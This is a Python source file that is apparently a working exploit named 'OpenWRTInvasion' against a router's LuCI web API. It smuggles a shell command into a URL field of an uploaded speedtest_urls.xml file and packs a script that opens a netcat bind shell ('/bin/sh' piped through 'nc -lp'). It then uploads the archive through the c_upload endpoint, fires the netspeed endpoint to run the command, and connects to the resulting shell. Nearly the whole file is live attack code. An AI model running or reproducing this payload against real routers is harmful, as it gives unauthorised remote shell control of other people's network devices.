speedtest_urls_template = '''<?xml version="1.0"?>
<root>
	<class type="1">
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
		<item url="http://127.0.0.1/4o4"/>
	</class>
	<class type="2">
		<item url="http://{router_ip_address} -q -O /dev/null;{command};exit;wget http://{router_ip_address} "/>
	</class>
	<class type="3">
		<item uploadurl="https://127.0.0.1/4o4"/>
	</class>
</root>
'''

exploit_command = "((sh /tmp/script.sh; rm /tmp/script.sh) &)"

script_template = '''#!/bin/ash

set -euo pipefail

rm -rf /tmp/invasion
mkdir /tmp/invasion
cd /tmp/invasion

mkfifo q
cat q|/bin/sh -si 2>&1|nc -lp {ncport} >q
'''

import socket
import time
import requests
import threading
import tarfile
from io import StringIO, BytesIO


def _tarstring(tar, s: str, filename: str):
    encoded = s.encode('utf-8')
    sio = BytesIO(encoded)
    info = tarfile.TarInfo(name=filename)
    info.size = len(encoded)
    tar.addfile(tarinfo=info, fileobj=sio)


class OpenWRTInvasion:
    def __init__(self, router_ip_address: str, ncport: int, logger=None):
        self.router_ip_address = router_ip_address
        self.ncport = ncport
        self.logger=logger

        speedtest_urls = speedtest_urls_template.format(router_ip_address=router_ip_address, command=exploit_command)
        script = script_template.format(ncport=ncport)

        self._payload = BytesIO()

        with tarfile.open(fileobj=self._payload, mode='w:gz') as tar:
            _tarstring(tar, speedtest_urls, 'speedtest_urls.xml')
            _tarstring(tar, script, 'script.sh')

        self._payload.seek(0)

    def run(self, stok):

        shellsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False
        attempt = 0

        while not connected and attempt < 5:
            attempt += 1
            time.sleep(0.2)
            # upload config file
            self.logger.info("Upload OpenWRTInvasion")
            r1 = requests.post(
                "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(self.router_ip_address, stok),
                files={"image": self._payload}
            )
            # print(r1.text)
            for i in range(3):
                self.logger.info("Run OpenWRTInvasion")
                # exec download speed test, exec command
                bg = threading.Thread(target=requests.get, args=(
                    "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(self.router_ip_address, stok),
                ))
                bg.start()
                time.sleep(0.2)
                while bg.is_alive():
                    try:
                        shellsock.connect((self.router_ip_address, self.ncport))
                        connected = True
                        break
                    except:
                        time.sleep(0.5)

                if connected:
                    break;

            if not connected:
                self.logger.error("OpenWRTInvasion failed!")
                shellsock=None
            else:
                self.logger.info("OpenWRTInvasion succeeded!")
            return shellsock
